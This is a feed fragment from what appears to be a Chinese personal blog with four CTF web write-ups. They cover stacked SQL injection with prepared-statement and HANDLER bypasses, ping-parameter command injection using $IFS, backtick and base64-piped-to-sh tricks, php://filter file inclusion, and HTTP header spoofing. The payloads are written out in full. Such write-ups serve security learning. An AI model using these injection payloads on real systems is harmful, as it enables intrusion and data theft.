        <id>http://imfanqie.top/2021/08/01/ctf/web/sql/(ctfwp)sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/</id>
        <title>(ctfwp)sql堆叠注入及预编译的学习</title>
        <link rel="alternate" href="http://imfanqie.top/2021/08/01/ctf/web/sql/(ctfwp)sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
        <content type="html">&lt;p&gt;很久没有碰 sql 注入了，最近几天复习了一下，顺便掌握了点新的知识。&lt;/p&gt;
&lt;p&gt;好多题的 wp 我都懒得写了，挑一两道写吧&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;先推一下两篇很有帮助的文章，以后自己复习用&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5L2FydGljbGUvZGV0YWlscy8xMDMyMzkxNDU/dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQmxvZ0NvbW1lbmRGcm9tTWFjaGluZUxlYXJuUGFpMiU3RWRlZmF1bHQtMS5jb250cm9sJmFtcDtkZXB0aF8xLXV0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yJTdFZGVmYXVsdCU3RUJsb2dDb21tZW5kRnJvbU1hY2hpbmVMZWFyblBhaTIlN0VkZWZhdWx0LTEuY29udHJvbA==&#34;&gt;[强网杯 2019] 随便注 的三种解法&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgyL2FydGljbGUvZGV0YWlscy8xMDk4OTg5MzQ=&#34;&gt;MySQL 之 handler 的详细使用及说明&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;1强网杯-2019随便注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1强网杯-2019随便注&#34;&gt;#&lt;/a&gt; 1.[强网杯 2019] 随便注&lt;/h2&gt;
&lt;p&gt;1. 先试试万能密码  &lt;code&gt;1‘ or 1=1 #&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有回显，这说明可以注入：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/01/mO94La6BcXyQAje.png&#34; alt&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;做个 FUZZ 测试，不放图了，发现 select 等关键词都被 ban 了，无法联合，只能少量报错注入。&lt;/p&gt;
&lt;p&gt;因此考虑堆叠注入。&lt;/p&gt;
&lt;p&gt;查库名：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;1&#39;; show databases;#  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/01/MFI4bqQuwJLSGXN.png&#34; alt&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;查表名:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;1&#39;; show tables;#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/01/u5ezX1GCZvMYxoQ.png&#34; alt&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;显然 flag 应该在长的那串数字里，查列名:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt; 1&#39;; show columns from `1919810931114514`;#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/01/QXhwPlA4Bk1ayGV.png&#34; alt&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;p&gt;flag 在这里，但是显示不出来 flag，很尴尬，于是学会了两个方法，&lt;/p&gt;
&lt;p&gt;第一种比较常规，第二种比较万能。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一种：预编译&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因为 select 被 ban 了，可以考虑 &lt;strong&gt;16 进制编码&lt;/strong&gt;绕过，也可以考虑&lt;strong&gt;拼接语句&lt;/strong&gt;绕过，我用了拼接语句。&lt;/p&gt;
&lt;p&gt;先构造语句&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1919810931114514&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;进行预编译：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;1&#39;; SET @a= concat(&#39;sel&#39;,&#39;ect&#39;,&#39;* from `1919810931114514`&#39;); prepare flag from @a; execute flag;#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注释一下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;定义：    SET @变量 = 语句（命令）&lt;/li&gt;
&lt;li&gt;预编译：   prepare name from 语句&lt;/li&gt;
&lt;li&gt;执行：   excute name&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;第二种：handler 方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过 handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到 SQL 标准中。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;此处需要用到的语法：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/01/vLFh9eMqa6DC8OW.png&#34; alt&gt;&amp;lt;!--p5--&amp;gt;&lt;/p&gt;
&lt;p&gt;构造 payload：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;1&#39;; handler `1919810931114514` open as a; handler a read first;#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;随便哪个 payload 都可得到 flag：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/01/uLexr5p63CUsQmw.png&#34; alt&gt;&amp;lt;!--p6--&amp;gt;&lt;/p&gt;
&lt;p&gt;另外本题还能通过改名和 mysql 约束去做，感觉太麻烦了，没学。。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;后面遇到堆叠注入和预编译的题再补上，就这样&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="sql" />
        <updated>2021-08-01T07:01:31.153Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/07/27/ctf/web/rce/(ctfwp)linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
        <title>(ctfwp)网站中linux命令执行</title>
        <link rel="alternate" href="http://imfanqie.top/2021/07/27/ctf/web/rce/(ctfwp)linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
        <content type="html">&lt;p&gt;这类的题不算多，在这里稍微总结一下&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;gxyctf2019ping-ping-ping&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gxyctf2019ping-ping-ping&#34;&gt;#&lt;/a&gt; [GXYCTF2019]Ping Ping Ping&lt;/h1&gt;
&lt;p&gt;第一次做这种题，有思路但缺少经验，所以没做出来，下面是 wp。&lt;/p&gt;
&lt;p&gt;进去界面什么都没有，只有  /?ip=&lt;/p&gt;
&lt;p&gt;查看源码无果，抓包无果，尝试输入 /?ip=1&lt;/p&gt;
&lt;p&gt;有结果 根据提示：ping&lt;/p&gt;
&lt;p&gt;考虑是 linux 命令，尝试查看目录  /?ip=1;ls&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/wk9qAWMTK8dtsyU.png&#34; alt=&#34;1.1.png&#34;&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;根据结果 cat flag.php，结果不让看，提示猜测应该是过滤了空格&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/bm2O53pIYcLjNzw.png&#34; alt=&#34;1.2.png&#34;&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;经过百度后，发现有以下几种绕过过滤空格的方式：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;${IFS} 替换&lt;/li&gt;
&lt;li&gt;$IFS$1 替换&lt;/li&gt;
&lt;li&gt;${IFS 替换&lt;/li&gt;
&lt;li&gt;%20 替换&lt;/li&gt;
&lt;li&gt;&amp;lt;和 &amp;lt;&amp;gt; 重定向符替换&lt;/li&gt;
&lt;li&gt;%09 替换&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;尝试第一种不行，&lt;strong&gt;(这里我提前做了下 FUZZ 测试，就不放图了，因为我看大佬都没用)&lt;/strong&gt; 发现 {} 等等都被过滤了&lt;/p&gt;
&lt;p&gt;于是用第二种&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/gxF3pWdyJhYZwlc.png&#34; alt=&#34;1.3.png&#34;&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;发现 flag 被过滤了，查阅资料后，发现两张方式最合适。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一种最常规：&lt;/strong&gt;  命令执行拼接&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;ip&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token class-name type-declaration&#34;&gt;cat&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$IFS&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$1fla&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;原理就是 linux 命令的拼接，让 a=g，然后将 flag 换为 fla$a&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二种最牛逼：&lt;/strong&gt;  内联绕过&lt;/p&gt;
&lt;p&gt;内联，就是将反引号内命令的输出作为输入执行。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;ip&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token class-name type-declaration&#34;&gt;cat&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$IFS&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;token string backtick-quoted-string&#34;&gt;`ls`&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;ls 输出的内容直接被执行了&lt;/p&gt;
&lt;p&gt;flag 如图：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/OYtxEreBvki36Vm.png&#34; alt=&#34;1.4.png&#34;&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;另外我还学到了一些其他的方法，可能本题不适用，但也很常见。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;单引号、双引号绕过&lt;/strong&gt;，本题被 ban 了&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ca&#34;t fl&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;ag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;反斜线绕过&lt;/strong&gt;，本题被 ban 了&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ca&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;t fl&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;ag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;$1、$2 等和 $@绕过&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c&lt;span class=&#34;token variable&#34;&gt;$1at&lt;/span&gt; gh&lt;span class=&#34;token variable&#34;&gt;$@&lt;/span&gt;twf01.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;如果&lt;strong&gt; cat 被过滤&lt;/strong&gt;，可以用下边的方法进行绕过～～&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(1)more:一页一页的显示档案内容

(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页

(3)head:查看头几行

(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示

(5)tail:查看尾几行

(6)nl：显示的时候，顺便输出行号

(7)od:以二进制的方式读取档案内容

(8)vi:一种编辑器，这个也可以查看

(9)vim:一种编辑器，这个也可以查看

(10)sort:可以查看

(11)uniq:可以查看

(12)file -f:报错出具体内容
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;本题还可以用&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;sh，bash 下编码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo$IFS$1Y2F0IGZsYWcucGhw&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;base64$IFS$&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;d&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;sh&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Y2F0IGZsYWcucGhw 是 cat flag.php 的 base64 编码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;echo&amp;quot;str&amp;quot; | base64 -d
将base64编码的字符串str+换行 解码输出
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;|sh 是以 sh 运行，不是 bash。&lt;/p&gt;
&lt;p&gt;具体参考下面这篇文章&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vc2VzbW8xOTg5L2FydGljbGUvZGV0YWlscy81MTA5MzQ4OQ==&#34;&gt;Linux base64 -- 用 base64 编解码&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;另外，常见的管道符还有 &lt;code&gt;||&lt;/code&gt;    &lt;code&gt; ;&lt;/code&gt;   如果做不出来可以尝试下其他的。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;有新题我会补两道&lt;/p&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="命令执行" />
        <updated>2021-07-27T13:45:24.931Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/07/27/ctf/web/file/(ctfwp)%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%20%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
        <title>(ctfwp)伪协议文件包含漏洞</title>
        <link rel="alternate" href="http://imfanqie.top/2021/07/27/ctf/web/file/(ctfwp)%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%20%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
        <content type="html">&lt;p&gt;很久没写了，随便写写，一切从简吧，最近搞 python 比较多。&lt;/p&gt;
&lt;p&gt;主要是记录一下新知识。&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;1极客大挑战-2019secret-file&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1极客大挑战-2019secret-file&#34;&gt;#&lt;/a&gt; 1.[极客大挑战 2019] Secret File&lt;/h1&gt;
&lt;p&gt;进去先探索一下，没啥有用的，看源码，根据提示走。&lt;/p&gt;
&lt;p&gt;发现第三步直接被跳过了，直接 end 了：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/pBIo3wnDZ9a7bKV.png&#34; alt&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;用 F12 看了半天没啥名堂，只能抓包确实能抓到东西：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/w8I2WnuKDbUzRCa.png&#34; alt&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;于是顺藤摸瓜打开网页，提示 flag 在 flag.php 里，但是打开后显示不出来：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/dt3VrHnAjK7yupz.png&#34; alt&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;前面还有个过滤，但是没有过滤 filter，考虑伪协议：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;file&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//filter/convert.base64-encode/resource=flag.php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;得到 base64，解密得到 flag。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/61pN9fzqdrigJ2t.png&#34; alt&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;2actf2020-新生赛include&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2actf2020-新生赛include&#34;&gt;#&lt;/a&gt; 2.[ACTF2020 新生赛] Include&lt;/h1&gt;
&lt;p&gt;进去只有一个 tip，点开不难发现，是一个文件读取的方式读处的数据：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/WQh7jbd68lq2xto.png&#34; alt&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;结合本题题目，考虑伪协议，文件包含。&lt;/p&gt;
&lt;p&gt;我自己做的时候还抓了一下包，确实没有什么其他方法。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;file&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token argument-name&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//filter/read=convert.base64-encode/resource=flag.php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;得到 base64，解密得到 flag。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/27/TSdzI6CD1YrGJUm.png&#34; alt&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;有新题我会继续补两道&lt;/p&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="文件包含" />
        <updated>2021-07-27T09:46:52.065Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/07/08/ctf/web/http/(ctfwp)http&amp;java/</id>
        <title>(ctfwp)http&amp;java</title>
        <link rel="alternate" href="http://imfanqie.top/2021/07/08/ctf/web/http/(ctfwp)http&amp;java/"/>
        <content type="html">&lt;p&gt;最近遇到不少奇奇怪怪的题，方法很少见且唯一，直接总结一下。&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;1极客大挑战-2019http&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1极客大挑战-2019http&#34;&gt;#&lt;/a&gt; 1.[极客大挑战 2019] Http&lt;/h1&gt;
&lt;p&gt;进去后是个介绍页面，由于没有信息，先查看源码&lt;/p&gt;
&lt;p&gt;发现相关信息，看名字可能与答案有关：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/09/75iSOFKhuLvEqzx.png&#34; alt&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;点进去后界面如下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/09/QayuWrD5PXvZ28o.png&#34; alt&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;根据网页提示，应该在头请求里修改 referer，这里有很多方法（burp 抓包添加，火狐 F12 网络里拦截修改，hackbar 修改）&lt;/p&gt;
&lt;p&gt;我都已尝试过了，所以这里用最简单的 hackbar：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/09/J72xVO9I3rhwS5F.png&#34; alt&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;界面如下，根据提示，要通过 Syclover 浏览，所以修改 user-agent：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/09/beNQ7p8JLwmOB2z.png&#34; alt&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;p&gt;界面如下，再根据提示，需要本地查看&lt;/p&gt;
&lt;p&gt;在简单的学习后，发现通过 X-Forwarded-For:127.0.0.1 可以伪造 ip 地址到本地&lt;/p&gt;
&lt;p&gt;（顺便学习了一下 html 请求头和响应头，相关文章附到后文）&lt;/p&gt;
&lt;p&gt;此时不能用 hackbar 添加，所以我选择用火狐工具直接修改：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/09/aDtPbyWs7F1rYjQ.png&#34; alt&gt;&amp;lt;!--p5--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/09/AbH2kJqEK1eCx4S.png&#34; alt&gt;&amp;lt;!--p6--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;2roarctf-2019easy-java&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2roarctf-2019easy-java&#34;&gt;#&lt;/a&gt; 2.[RoarCTF 2019]Easy Java&lt;/h1&gt;
&lt;p&gt;这题真是没见过就不会做，进去先注入了几下，没有；扫目录，没有，点开 help，考虑是利用了 download 下载了啥东西：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/09/TGKIYO9XR3WZFi2.png&#34; alt&gt;&amp;lt;!--p7--&amp;gt;&lt;/p&gt;
&lt;p&gt;然后就没思路了，被迫看了眼 wp：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/09/4wSl2v31ZkYTWdn.png&#34; alt&gt;&amp;lt;!--p8--&amp;gt;&lt;/p&gt;
&lt;p&gt;确实有漏洞，能带出源码，虽然我没听过，所以我查了一下相关资料：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3L2FydGljbGUvZGV0YWlscy83ODE2NTA1MQ==&#34;&gt;ctf/web 源码泄露及利用办法&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;nb，继续做题：&lt;/p&gt;
&lt;p&gt;这里 get 下载不下来东西，burp 抓包后用 post 下载 web-xml (通过 WEB-INF)：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/09/mNJiabWD8R4QPKv.png&#34; alt&gt;&amp;lt;!--p9--&amp;gt;&lt;/p&gt;
&lt;p&gt;根据漏洞说明，找到相关的 class 文件，下载（就是我图中画出来的文件）：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/08/09/qoeW7GXHcf5R81S.png&#34; alt&gt;&amp;lt;!--p10--&amp;gt;&lt;/p&gt;
&lt;p&gt;得到 base64 加密后的 flag，结束&lt;/p&gt;
&lt;p&gt;说实话这题挺简单，主要靠经验做，但是像我这种 cj，直接傻眼。。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;附参考文章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#附参考文章&#34;&gt;#&lt;/a&gt; 附：参考文章&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2x2Y2hlbi9wLzEwMTY5MjQ1Lmh0bWw=&#34;&gt;HTML 请求头，响应头和 HTTP 状态码&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucnVub29iLmNvbS9odHRwL2h0dHAtbWV0aG9kcy5odG1s&#34;&gt;菜鸟教程 HTTP 请求方法&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93aW5kYXJkLmNvbS9wcm9qZWN0LzIwMTYvMDUvMDgvRm9yZ2UtSVAtQWRkcmVzcw==&#34;&gt;通过修改 http 请求的 header 请求头来伪造 ip&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d5Xzk3L2FydGljbGUvZGV0YWlscy83ODE2NTA1MQ==&#34;&gt;ctf/web 源码泄露及利用办法&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;遇到类似的的奇怪题再总结&lt;/p&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
